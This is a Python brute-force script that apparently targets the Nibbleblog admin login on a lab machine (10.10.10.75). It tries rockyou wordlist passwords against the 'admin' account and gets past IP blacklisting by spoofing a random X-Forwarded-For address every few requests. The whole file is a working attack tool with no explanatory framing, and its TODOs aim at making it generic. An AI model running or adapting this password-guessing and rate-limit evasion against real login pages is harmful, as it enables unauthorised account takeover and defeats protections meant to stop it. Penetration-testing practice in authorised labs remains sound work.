from random import randint

import requests


# -------------------------------------------------------------
# TODO:
# - Add all project specific information as program arguments.
# - Add tried IP addresses to a set to avoid accidental reuse.
# - Don't generate network or broadcast IP addresses.
# - Consider removing the requests dependency and using urllib.
# -------------------------------------------------------------


# Brute force information
# The `RATE_LIMIT` value should be the number of requests after
# which an IP address is blacklisted. We will switch IP addresses
# before this limit is hit to avoid spamming the blacklist log.
PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
RATE_LIMIT = 5
RATE_LIMIT_ERROR = 'Blacklist protection'
LOGIN_FAILED_ERROR = 'Incorrect username or password.'

# Target information
RHOST = '10.10.10.75'
LOGIN_PAGE = '/nibbleblog/admin.php'
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'
USERNAME = 'admin'


def attempt_login(password: str, ip: str) -> bool:
    """Performs a login using a given password.

    :param password: The password to try.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True if the login was successful, otherwise False.
    """
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'password': password}
    r = requests.post(TARGET_URL, headers=headers, data=payload)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return LOGIN_FAILED_ERROR not in r.text


def random_ip() -> str:
    """Generate a random IP address.

    :return: A random IP address.
    """
    return ".".join(str(randint(0, 255)) for _ in range(4))


def run(start_at: int = 1):
    """Start the brute force process.

    :param start_at: Start brute forcing at the password with this 1-based index.
     The number represents the line in the password file. This is handy if the
     program was stopped during a previous attempt, allowing the user to resume
     the attack.
    """
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break
        
        num_attempts += 1

        
if __name__ == '__main__':
    run()
